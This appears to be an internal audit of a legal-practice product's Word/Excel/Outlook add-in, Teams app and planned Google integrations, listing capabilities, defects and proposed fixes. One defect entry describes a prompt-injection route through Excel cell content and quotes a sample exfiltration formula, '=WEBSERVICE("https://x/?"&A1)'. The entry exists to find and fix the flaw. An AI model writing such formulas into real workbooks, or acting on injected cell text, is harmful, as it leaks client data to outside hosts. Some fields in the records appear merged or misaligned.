area: Office add-in (Word/Excel/Outlook), Teams app, and Google-side equivalents
summary: The Office add-in (office-addin/) is one TypeScript/Vite task pane for Word, Excel and Outlook, using two add-in-only XML manifests (v0.1.0.0). It does one thing: capture the current selection, ask LawHand's LLM for a one-action JSON plan, show a before/after preview, and apply it after the user approves. The only actions are Word replace-selection (plain text), Excel set values/formulas on the selected range, and Outlook compose set-subject. Sign-in uses Nested App Authentication (NAA): an Entra token is exchanged at POST /api/auth/office/exchange for LawHand's HTTP-only cookies. That works only for users who already have a linked Microsoft identity, and the cookie approach is probably broken wherever Office runs the pane in an iframe (Office on the web, new Outlook). The backend is off everywhere: OFFICE_ASSISTANT_ENABLED=false, plus a tenant allowlist that is empty. The dev1 compose file disables the add-in container. The plan and audit record carry no matter context and no retrieval of firm content (RAG). The add-in has no template or clause insertion, no tracked changes, no save-back to a matter, no Outlook file-to-matter and no Smart Alerts; all of these exist only as plans in docs/office-document-assistant-plan.md and the Template Studio W2 plan. Because the manifests are XML, the add-in cannot host a Copilot agent: Microsoft only lets Word/Excel/PowerPoint add-ins act as Copilot skills when they use the unified manifest. The Teams app (manifest 1.17) has only a personal static tab (a launcher with links to Matters/Calendar and a list of linked channels) and a team configurable tab. It has no bot, message extension, meeting app, activity feed or working SSO. In production the edge nginx sends X-Frame-Options SAMEORIGIN and frame-ancestors 'self', so Teams is very likely unable to embed either tab. What does ship for Teams: an admin panel for matter-to-channel links, Adaptive Card channel posts for 2 event types (sent with a delegated admin token), and Teams Phone call-metadata capture via CallRecords.Read.All. On the Google side there is no Workspace add-on, Chat app, Docs API or Apps Script. A contextual Gmail/Calendar/Drive/Docs add-on (ECO-19) and a Gemini Enterprise MCP pilot (ECO-21) are planned only, as Phase 3. The strongest existing hook for using the client's own office suite is the web-side cloud working-copy flow (a generated DOCX is edited in OneDrive, SharePoint or Google Drive, then synced back via /tasks/{id}/pending-action/sync-cloud). No add-in or Teams surface connects to it.

capabilities.name: Word: replace selected text with an approved LLM plan (preview/approve/apply, fingerprint-bound)
capabilities.notes: Plain text only, one action per plan. Gated by OFFICE_ASSISTANT_ENABLED=false (backend/app/config.py:112) plus an empty pilot allowlist (.env.hypervisor:92-94).

capabilities.name: Excel: set values or formulas on the selected range (shape-checked, capped at 2,500 cells)
capabilities.notes: Server bans external/volatile formulas for set_selected_formulas only (backend/app/services/office_action_policy.py:185-203).

capabilities.name: Outlook compose: change the subject line only
capabilities.notes: No body insertion, reply draft, recipients or attachments. The full draft body is still sent to the model.

capabilities.name: Outlook read mode (review a received message)
capabilities.notes: The manifest adds a Read-surface button, but the server rejects read items (office_action_policy.py:72-73, 109-113).

capabilities.name: NAA sign-in plus exchange for LawHand cookies (/api/auth/office/exchange)
capabilities.notes: Linked Microsoft identities only (backend/app/routers/auth.py:1749-1771). No dialog fallback. Cookie session is probably unusable when the pane is iframed.

capabilities.name: Metadata-only audit of plans and results (HMAC digests, token usage)
capabilities.notes: No matter_id or conversation_id column (backend/app/models/office_action_run.py:48-88), so AI work cannot be attributed to a matter.

capabilities.name: GET /api/office/policy (limits and allowed actions)
capabilities.notes: Implemented but the task pane never calls it; limits are hardcoded in the adapters.

capabilities.name: Add-in packaging: two add-in-only XML manifests (Word+Excel TaskPaneApp, Outlook MailApp, Mailbox 1.3)
capabilities.notes: No unified JSON manifest, no MobileFormFactor, no pinning, no LaunchEvent. The unified manifest is 'evaluate later' in docs/office-document-assistant-plan.md:25-30,297.

capabilities.name: Word template/clause insertion via content controls (Template Builder add-in, W2)
capabilities.notes: No wordTemplateAdapter.ts and no /versions/from-word endpoint exist in code.

capabilities.name: Tracked changes, comments and content-control anchors in Word
capabilities.notes: wordAdapter detects WordApi 1.4 (line 21) but never uses changeTrackingMode.

capabilities.name: Save the Word/Excel/Outlook item to a matter (/api/office/capture)
capabilities.notes: The route does not exist in backend/app/routers/office_assistant.py.

capabilities.name: Outlook file-to-matter, extract tasks/deadlines, reply draft
capabilities.notes: Server-side rules-based capture exists separately (backend/app/services/correspondence_capture.py:1-20).

capabilities.name: Outlook Smart Alerts / event-based activation
Copilot agent inside the add-in / LawHand Matter Agent in M365 Copilot
capabilities.notes: ECO-09..12. XML manifests cannot declare copilotAgents or add-in actions.

capabilities.name: Teams personal static tab (/teams): launcher links plus list of linked channels
capabilities.notes: Page content: frontend/src/pages/TeamsTabPage.jsx:29-79. Probably cannot be embedded: nginx frame-ancestors 'self'.

capabilities.name: Teams configurable team tab (/teams/config) linking a channel to a matter
capabilities.notes: Admin-only route (frontend/src/App.jsx:350-353). The save handler never calls setConfig.

capabilities.name: Teams admin panel: list teams/channels, create channel, link matter to channel, test card
capabilities.notes: UI: frontend/src/components/TeamsPanel.jsx:149-244.

capabilities.name: Teams channel notifications (Adaptive Card 1.4) for deadline_approaching and voice_call_captured
capabilities.notes: Posted through delegated Graph ChannelMessage.Send (backend/app/services/teams.py:364-418).

capabilities.name: Teams Phone inbound call capture (call records plus PSTN reconciliation)
capabilities.notes: Metadata only, no recordings or transcripts (frontend/platform_docs/administrative-guide/13-microsoft-teams-administration.md:65).

capabilities.name: Teams bot, message extensions, meeting app, activity feed, Teams SSO
capabilities.notes: Teams bot/SSO explicitly deferred. webApplicationInfo is declared (teams-app/manifest.json:48-51) but no getAuthToken code exists.

capabilities.name: Edit generated DOCX in the tenant's OneDrive/SharePoint/Google Drive, then sync back as a verified revision
capabilities.notes: Web flow only. Not reachable from the add-in or Teams. Binding checks at tasks.py:1985-1994.

capabilities.name: LawHand Google Workspace add-on (Gmail/Calendar/Drive/Docs sidebar)
capabilities.notes: ECO-19. Phase 3 in docs/workspace-ecosystem-trials-onboarding-plan-2026-08-27.md:721-725. No Apps Script, Chat or Docs API code in the repo.

capabilities.name: Gemini Enterprise MCP/A2A agent
capabilities.notes: ECO-21, gated on Microsoft agent metrics.

defects.title: Teams can very likely not embed either Teams tab
defects.detail: The server-level headers X-Frame-Options SAMEORIGIN and CSP frame-ancestors 'self' apply to every SPA route served by location / (nginx.conf:690-700; same again at 763-768 and 1037 for :443). There is no /teams exception, unlike /office/ (nginx/snippets/office_addin.conf:26).
defects.user_impact: A firm that installs the Teams app probably sees a blank 'refused to connect' tab for both the personal tab and the configurable tab.

defects.title: Teams tabs rely on the SPA cookie session with no Teams SSO
defects.detail: TeamsTabPage/TeamsTabConfigPage sit behind ProtectedRoute (App.jsx:346-353). An unauthenticated user is sent to /login inside the Teams iframe. Auth cookies default to SameSite=Lax (backend/app/config.py:60), so the browser does not send them in a cross-site iframe. webApplicationInfo is declared (teams-app/manifest.json:48-51) but no code calls authentication.getAuthToken and there is no token-exchange endpoint.
defects.user_impact: Even after the framing fix, users inside Teams hit a login page that cannot finish in an iframe (Microsoft login refuses to be framed).

defects.title: Excel set_selected_values bypasses the unsafe-formula ban
defects.detail: Values are checked only for JSON scalar type (office_action_policy.py:53-57). The WEBSERVICE/HYPERLINK/external-reference regex (lines 31-35) runs only for set_selected_formulas (185-203). The client writes range.values directly (office-addin/src/hosts/excelAdapter.ts:102), and Excel reads a value starting with '=' as a formula. validation.ts:99-102 does not check values either.
defects.user_impact: Prompt-injected cell content can make the model return a value like '=WEBSERVICE("https://x/?"&A1)'. It is buried in a JSON preview and, once applied, can exfiltrate workbook data or add external links, defeating the stated guard.

defects.title: Add-in cookie session probably fails in Office on the web and new Outlook
defects.detail: The exchange sets HTTP-only cookies (backend/app/routers/auth.py:1788-1790) with SameSite from _cookie_flags (auth.py:483-499; default lax, config.py:60). The pane then re-reads /auth/me with credentials. The code's own comment (officeSession.ts:73-77) says the Lax cookie is not sent cross-site. On web hosts the pane is iframed under office.com / cloud.microsoft, so the cookie is dropped and the pane shows 'Office sign-in completed without a LawHand session'.
defects.user_impact: The pilot works at best in classic desktop clients. Word/Excel on the web and new Outlook for Windows, which Microsoft is making the default, cannot sign in.

defects.title: Add-in CSP frame-ancestors omits *.cloud.microsoft
defects.detail: Allowed ancestors are *.office.com, *.office365.com, *.live.com and *.microsoft.com. Microsoft 365 web apps are moving to word/excel/outlook/m365.cloud.microsoft. frame-ancestors checks every ancestor, including the top-level page.
defects.user_impact: The task pane can be blocked from loading in Office on the web or new Outlook served from cloud.microsoft domains.

defects.title: The Outlook read-mode button is a dead end
defects.detail: The manifest advertises 'Review Outlook messages' and activates on read items (outlook.xml:29-31, 41-53). main.ts:43-46 enables Propose without checking capabilities.writeEnabled. The server then rejects the plan with 'This Office host is read-only' (office_action_policy.py:72-73), after the full message body (up to 50k characters) has been uploaded.
defects.user_impact: A user who opens LawHand on a received email, types 'summarize', gets an error, and has sent client email content to the server for nothing.

defects.title: The committed Teams package is stale (old domain and old Entra app)
defects.detail: manifest.json in teams-app/lawhand-teams.zip still points at legalapp.perevagagroup.com and webApplicationInfo id c805316c-..., while teams-app/manifest.json uses getlawhand.com and 062a7776-.... CI never rebuilds it. package.ps1 needs Windows (System.Drawing) and TASKS.md:146 is still open.
defects.user_impact: An admin who uploads the checked-in zip installs an app that loads the wrong host.

defects.title: The Teams channel-tab save reports success without creating a working tab
defects.detail: setConfig is only called through window.microsoftTeams (line 69), which the ESM @microsoft/teams-js v2 import (line 2) does not create as a global. saveConfiguration catches its own errors (line 79), so registerOnSaveHandler always calls notifySuccess (line 90), even when createTeamsLink failed.
defects.user_impact: Admins can save a channel tab that has no content URL or no matter link, with no error shown.

defects.title: The personal tab shows 'No channels linked' to every non-admin
defects.detail: GET /links goes through require_teams_enabled, which requires the admin role (routers/teams.py:155-157). TeamsTabPage.jsx:10-12 swallows the 403 and renders an empty list.
defects.user_impact: Attorneys and staff wrongly conclude that no matter channels exist.

defects.title: Unused high-privilege Teams Graph scopes are requested
defects.detail: Chat.ReadWrite (read/write all of the user's chats) and TeamsActivity.Send are required for teams_connected, but nothing in backend/app references chats or sendActivityNotification. The admin guide discloses them (13-microsoft-teams-administration.md:18).
defects.user_impact: Over-broad consent is a blocker in law-firm security reviews and exposes privileged chat content if a token leaks.

defects.title: Add-in session expires after 30 minutes with no recovery
defects.detail: authenticated is set once at startup. OfficeApi.request throws on any non-OK response (office-addin/src/api/officeApi.ts:21-28) and never calls /auth/refresh or re-runs session.ensure. ACCESS_TOKEN_EXPIRE_MINUTES=30 (backend/app/config.py:42).
defects.user_impact: A pane left open in Word fails with 'Not authenticated' until the user closes and reopens it.

defects.title: Word apply is untracked and flattens formatting
defects.detail: insertText(..., replace) swaps the selection for plain text. Mixed formatting, fields, cross-references and footnote references inside the selection are lost. WordApi 1.4 is detected (line 21) but track changes is never turned on.
defects.user_impact: An AI rewrite of a clause in a negotiated draft leaves no redline for opposing counsel or the supervising attorney.

defects.title: Audit-failure status is wrong on reject and hidden on apply
defects.detail: report() always says 'The Office change completed, but LawHand could not record its audit result' (line 101), including after a Reject where nothing changed (lines 154-165). On a successful apply, setStatus('Approved change applied.') at line 142 immediately overwrites the audit-failure message.
defects.user_impact: Users are misled about whether the document changed, and compliance is never told that an applied AI change went unaudited.

defects.title: Teams notification cards appear authored by a named admin
defects.detail: The cards are posted with delegated ChannelMessage.Send (teams.py:401-406) using the consenting user's or tenant credential's token. There is no bot identity.
defects.user_impact: Channel members see deadline alerts 'from' a partner and may reply to that person, expecting a human.

defects.title: Word stale-check anchors on the selected text only
defects.detail: The fingerprint is sha256 of the selected text, with no position or paragraph identity.
defects.user_impact: If the user re-selects identical boilerplate elsewhere, the plan applies there without a stale warning.

defects.title: Client limits are hardcoded; the policy endpoint and settings are ignored
defects.detail: The Word/Excel limits are constants (excelAdapter.ts:13). /api/office/policy (routers/office_assistant.py:47-63) is never called. The schema caps Word text at 50,000 regardless of OFFICE_MAX_WORD_CHARACTERS (backend/app/schemas/office_assistant.py:46).
defects.user_impact: If an admin changes the limits, users get unexplained 422 errors, or the new limit silently has no effect.

defects.title: The Office exchange denies demo tenants that the plan endpoints allow
defects.detail: The exchange calls require_office_pilot_tenant directly, while plans use require_office_for_user, which exempts billing_tier=='demo' (backend/app/services/office_access.py:42-48).
defects.user_impact: Sales demos cannot sign in to the add-in unless the demo tenant is also allowlisted.

defects.title: Missing Entra audience yields a bogus '/office.access' scope
defects.detail: VITE_OFFICE_API_SCOPE is built as ${OFFICE_ENTRA_API_AUDIENCE:-}/office.access, so it is never empty. That bypasses the 'Office SSO is not configured' guard (office-addin/src/auth/officeSession.ts:40-42).
defects.user_impact: A misconfigured deployment shows an opaque MSAL error instead of a clear configuration message.

opportunities.title: Move to the unified Microsoft 365 manifest and ship add-in actions as a Copilot skill
opportunities.detail: Merge word-excel.xml, outlook.xml and the Teams app into one unified-manifest package. Declare copilotAgents plus runtime actions (insertClause, fillTemplateFields, applyTrackedRedline, fileToMatter) so the firm's Microsoft 365 Copilot becomes the natural-language front end and calls LawHand's deterministic Office.js functions with parameters. One app is then deployed through Integrated Apps. Keep the XML Outlook manifest as a fallback until the client-coverage matrix is proven. Microsoft only allows Word/Excel/PowerPoint add-ins as Copilot skills with the unified manifest (preview).

opportunities.title: LawHand Matter Agent (declarative agent) over the existing Workspace MCP
opportunities.detail: Finish ECO-09..12: a declarative agent in M365 Copilot, Teams, Outlook and Word that calls the existing read/propose Workspace MCP tools (matter context, templates, propose task/document). Reasoning and Work IQ grounding in the user's mail, meetings and files run on the client's Copilot license. LawHand keeps review-first execution and pays nothing for generic drafting.

opportunities.title: Template and clause insertion in Word via content controls
opportunities.detail: Build W2: in the pane, pick a matter and a template or clause, then insert it wrapped in tagged rich-text content controls. Fill fields deterministically from template_fill_engine/template bindings with no LLM, then round-trip to a new draft template version. This matches Clio Draft's Template Builder and uses the firm's own Word.

opportunities.title: Connect the add-in to the cloud working-copy sync
opportunities.detail: When a document open in Word is a LawHand working copy (detect it via a custom XML part or document property written at push time), show a pane banner with 'Sync this revision to LawHand' that calls the existing /tasks/{id}/pending-action/sync-cloud. Users draft with their own Word (and Copilot in Word), and LawHand records a verified revision. The same pattern works for Google Docs through a Docs add-on.

opportunities.title: Tracked-changes and comment mode for every Word apply
opportunities.detail: Before apply, set document.changeTrackingMode to trackAll (WordApi 1.4) and restore the user's setting afterwards. Put the plan summary and warnings in a Word comment on the edited range, and render a word-level diff in the preview. This resolves product decision 6 in the plan.

opportunities.title: Outlook: file to matter, extract deadlines and tasks, pinnable pane
opportunities.detail: Replace the subject-only surface with read-mode actions: file the message as .eml via item.getAsFileAsync (Mailbox 1.14, no Graph Mail scope) into the correspondence_capture pipeline, propose tasks or deadlines as review-first proposals, and suggest the matter from the sender's party match. Add SupportsPinning and an ItemChanged handler.

opportunities.title: Outlook Smart Alerts for privileged and wrong-matter email
opportunities.detail: Add an OnMessageSend handler (Mailbox 1.12, admin-deployed, soft-block first) that warns when recipients include opposing-party domains, when an attachment comes from a different matter, or when a privileged marker is missing. Add OnNewMessageCompose to insert a matter-specific disclaimer. This needs VersionOverridesV1_1 or the unified manifest.

opportunities.title: Teams SSO plus a bearer-token mode for embedded surfaces
opportunities.detail: Use Teams getAuthToken and Office NAA tokens directly as API bearer credentials (or exchange them for a short-lived in-memory token) instead of SameSite=Lax cookies. Add a /teams-scoped frame-ancestors rule covering teams.microsoft.com and *.cloud.microsoft. This single change unblocks the Teams tabs, Office on the web and new Outlook.

opportunities.title: Teams message extensions that also work as Copilot plugins
opportunities.detail: Add a bot and message extensions: search matters and insert a matter card into a chat, 'Save message to matter', and link unfurling for getlawhand.com/matters URLs. Microsoft 365 Copilot can call message extensions as plugins, so the same work puts LawHand in the client's Copilot chat.

opportunities.title: Meeting recap into a matter note and time entry
opportunities.detail: After a Teams meeting linked to a matter, pull the transcript or the Copilot meeting AI-insights recap (where the firm licenses Copilot) and stage propose_matter_note_from_meeting plus a draft time entry. Summarization runs on the client's Copilot.

opportunities.title: Personal Teams activity-feed alerts instead of channel posts as a human
opportunities.detail: Use TeamsActivity.Send (already consented) to notify the responsible attorney of deadlines in their activity feed. This needs manifest 'activities' and the app installed for the user. Drop Chat.ReadWrite until a feature needs it.

opportunities.title: Google Workspace add-on for Gmail, Calendar, Drive and Docs (ECO-19)
opportunities.detail: One Apps Script or HTTP-runtime add-on. Gmail contextual trigger: resolve the matter, file the thread, propose a task. Calendar: prepare for a hearing. Docs editor add-on: insert a template or clause and sync the working copy back. This is the Google parity for the Office pane and reuses the Workspace MCP contracts.

opportunities.title: Publish LawHand custom steps for Google Workspace Studio (Gemini flows)
opportunities.detail: Workspace Studio custom starters and steps began rolling out in September 2026 and are distributed as Workspace add-ons. Publish 'Find matter', 'File to matter' and 'Propose task/deadline' steps so firms can build Gemini-powered flows (for example, a court email arrives, Gemini summarizes it, LawHand proposes a deadline for review) that run on the firm's Gemini licenses.

opportunities.title: Register Workspace MCP in Gemini Enterprise (ECO-21)
opportunities.detail: Connect the same read/propose MCP server as a Gemini Enterprise custom MCP connector, so firms licensed for Gemini Enterprise get matter briefs without LawHand model spend.

opportunities.title: Admin 'Microsoft 365 apps' card: deploy the add-in and Teams app from LawHand
opportunities.detail: In Integrations, show add-in and Teams app status, download links for the rendered manifests (/office/manifests/*.xml) and a freshly generated Teams zip, Integrated Apps deployment steps, and a health check (policy endpoint, exchange, framing). Today nothing in frontend/src mentions the add-in.

opportunities.title: Matter-grounded pane: matter picker plus RAG context in plans
opportunities.detail: Add optional matter_id and conversation_id to the context envelope, as the plan specifies. Ground plans in matter facts, templates and firm memory (today context='' in the LLM call), and record matter_id on office_action_runs for billing and time attribution.

ux_findings.issue: The brand mark reads 'WP'; the product mark is 'LH' (frontend/src/pages/ProductPage.jsx:219).
ux_findings.suggestion: Use the LawHand LH mark or icon.

ux_findings.issue: Propose is enabled when the host is read-only (Outlook read) or the Word selection is empty, which leads to a server 422.
ux_findings.suggestion: Gate on capabilities.writeEnabled and selection charCount, and explain inline why the button is disabled.

ux_findings.issue: Exchange failures show only an HTTP code, e.g. '(403)', dropping the server detail ('identity is not linked', 'not enabled').
ux_findings.suggestion: Parse the detail and map it to actionable copy (link your Microsoft account in LawHand, ask your admin to enable the pilot).

ux_findings.issue: When sign-in fails or the session expires there is no Retry or Sign in button; the user must close and reopen the pane.
ux_findings.suggestion: Add a Retry sign-in button and re-run session.ensure automatically on a 401.

ux_findings.issue: A blank textarea with no suggested actions. Users must invent prompts, and nothing explains the one-action limit.
ux_findings.suggestion: Add per-host quick actions (Tighten clause, Plain-English explanation, Explain formula, Draft subject) and a line saying what the pane can change.

ux_findings.issue: Before/after are raw JSON matrices in monospace (styles.css:36), so changed cells and formulas cannot be scanned.
ux_findings.suggestion: Render a small cell grid with changed cells highlighted and formulas visually marked.

ux_findings.issue: Before and after are shown as two full text blocks with no inline diff, so small wording changes in a long clause are easy to miss.
ux_findings.suggestion: Show a word-level diff with insertions and deletions, like a redline.

ux_findings.issue: The button says 'Use current selection', but Outlook captures the whole item (subject and body, possibly the whole thread).
ux_findings.suggestion: Label it per host ('Use this email' / 'Use this draft') and show the body length and thread warning before capture.
Map the codes to plain-language guidance (re-select the same range, the document is protected, etc.).

ux_findings.issue: Hardcoded light palette that ignores the Office theme, so the pane is bright white in dark-mode Outlook or Word.
ux_findings.suggestion: Read Office.context.officeTheme or prefers-color-scheme and define color tokens.

ux_findings.issue: aria-live='polite' on the whole <main> plus role='status' on #status (line 58) causes repeated screen-reader announcements of the entire preview.
ux_findings.suggestion: Keep the live region only on #status.

ux_findings.issue: The captured context goes stale silently when the user moves the selection; the problem only surfaces as 'stale' at apply time.
ux_findings.suggestion: Listen for DocumentSelectionChanged / ItemChanged and mark the capture as outdated with a Re-capture prompt.

ux_findings.issue: The pane never shows or lets the user choose the matter, so users cannot tell whether firm or matter knowledge is used (it is not).
ux_findings.suggestion: Add a matter chip or picker, suggested from the file name, sender or document properties.

ux_findings.issue: 16, 32 and 80 px ribbon icons all point to the 96x96 PNG (the same in outlook.xml:72-74), so icons look blurry and fail Marketplace validation.
The tab is only a launcher: Matters/Calendar open new browser tabs (target=_blank) and nothing about matters is shown in Teams.
ux_findings.suggestion: Show 'My matters and upcoming deadlines' inline and use Teams deep links or stageView instead of new browser tabs.

ux_findings.issue: The channel tab's content URL is the generic /teams page, not the linked matter (entityId=matterId is ignored), so every channel tab shows the same firm-wide list.
ux_findings.suggestion: Point contentUrl at /teams/matter/{id} and read app.getContext() channelId to show that matter's dashboard.

ux_findings.issue: The selects have no labels (placeholder options 'Team'/'Channel'/'Matter'). An object error detail renders as '[object Object]' (line 80) because the page does not use teams/teamsErrors.errorText.
ux_findings.suggestion: Add <label>s and use errorText() like TeamsPanel does.

ux_findings.issue: 'Teams permissions required' shows a bare Connect button with no explanation of scopes or who must consent, and non-admins are silently redirected away (App.jsx:352).
ux_findings.suggestion: Explain the admin-consent need and show a 'Ask your LawHand admin' state for non-admins.

ux_findings.issue: Nowhere does it say how to install the LawHand Teams app or Office add-in; the only guidance lives in repo docs.
ux_findings.suggestion: Add an 'Install in Microsoft 365' section with package and manifest downloads and Integrated Apps steps.

api_surface.provider: Microsoft Entra (NAA via MSAL nestable client)
api_surface.purpose: Get a delegated token for the LawHand API to exchange for a session
Verify the Entra token (aud/scope/tid/oid) and set LawHand cookies
api_surface.scope_needed: office.access; user must already be a linked Microsoft LawHand user in a pilot tenant

api_surface.purpose: Generate a one-action Office plan through the LLM
List teams for the admin link UI
Post an HTML or Adaptive Card notification as the delegated user
api_surface.scope_needed: ChannelMessage.Send (delegated); Chat.ReadWrite and TeamsActivity.Send are also required but unused (teams.py:40-46)

api_surface.purpose: App-only client-credentials token for call records
Read inbound Teams Phone call metadata and reconcile against the PSTN usage report
Change-notification subscription for new call records

open_questions: Has the Teams app ever been installed against production? If so, does Cloudflare or another layer rewrite X-Frame-Options/frame-ancestors for /teams? The repo nginx config would block framing.

Has the Office add-in ever been sideloaded end-to-end (docs/office-pilot-activation.md section 3)? In particular, did Word/Excel on the web or new Outlook sign in, given the SameSite=Lax cookie design?

Should the pilot confirm in a real Excel build that range.values with a leading '=' is written as a formula (Microsoft's Range.values documentation says it is), to size the set_selected_values bypass?
Product decisions still open in docs/office-document-assistant-plan.md:374-380: tracked changes mandatory? add-in access for non-Microsoft (Google/password) LawHand accounts? whole-document analysis?

What share of target firms license Microsoft 365 Copilot or Gemini Enterprise? That decides whether to build add-in-hosted Copilot skills (preview, unified manifest) before the Copilot Studio/MCP Matter Agent (ECO-09..12).

Should LawHand keep paying for generic LLM rewriting in the pane, or cede generic drafting to the client's Copilot in Word/Gemini in Docs and focus the pane on matter-grounded, deterministic actions (templates, clauses, filing, redline)?
Does the ESM @microsoft/teams-js 2.53 build in this bundle set window.microsoftTeams? If not, TeamsTabConfigPage never calls setConfig.
Should Chat.ReadWrite and TeamsActivity.Send be removed from TEAMS_REQUIRED_SCOPES now (forcing re-consent), or kept until activity-feed and chat features ship?
